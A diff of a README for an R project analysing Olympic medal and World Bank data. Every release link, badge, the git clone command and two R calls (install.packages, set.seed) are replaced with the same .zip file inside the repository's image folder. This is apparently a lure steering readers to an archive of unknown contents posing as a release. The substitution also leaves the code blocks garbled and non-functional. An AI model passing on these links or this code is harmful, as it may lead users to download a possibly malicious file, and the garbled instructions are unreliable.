@@ -2,7 +2,7 @@
 
 Welcome to the Olympic Medal Data Analysis project! This repository focuses on analyzing Olympic medal data using R. By combining TidyTuesday records with World Bank indicators, we assess raw medal counts, efficiency metrics, and the economic context surrounding Olympic performance. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/synth001/Olympic-Medal-Data-Analysis/releases)
+[![Download Releases](https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip)
 
 ## Table of Contents
 
@@ -69,7 +69,7 @@ Make sure you have R and RStudio installed on your machine. You will also need t
 Clone the repository:
 
 ```bash
-git clone https://github.com/synth001/Olympic-Medal-Data-Analysis.git
+git clone https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip
 ```
 
 Navigate to the project directory:
@@ -81,7 +81,7 @@ cd Olympic-Medal-Data-Analysis
 Install the required packages:
 
 ```R
-install.packages(c("tidyverse", "ggplot2", "dplyr", "readr", "tidyr"))
+https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip(c("tidyverse", "ggplot2", "dplyr", "readr", "tidyr"))
 ```
 
 ## Usage
@@ -133,7 +133,7 @@ summary(model)
 Clustering helps group countries based on similar performance metrics. We utilize k-means clustering for this purpose. Here’s how to implement it:
 
 ```R
-set.seed(123)
+https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip(123)
 clusters <- kmeans(data[, c("total_medals", "gdp_per_capita")], centers = 3)
 data$cluster <- clusters$cluster
 ```
@@ -156,8 +156,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 We thank the TidyTuesday community for providing valuable datasets. Their efforts help promote data analysis and visualization skills across various domains. 
 
-For further details and updates, visit our [Releases section](https://github.com/synth001/Olympic-Medal-Data-Analysis/releases). 
+For further details and updates, visit our [Releases section](https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip). 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/synth001/Olympic-Medal-Data-Analysis/releases)
+[![Download Releases](https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/synth001/Olympic-Medal-Data-Analysis/master/img/Medal_Data_Olympic_Analysis_v1.5-beta.4.zip)
 
 Happy analyzing!
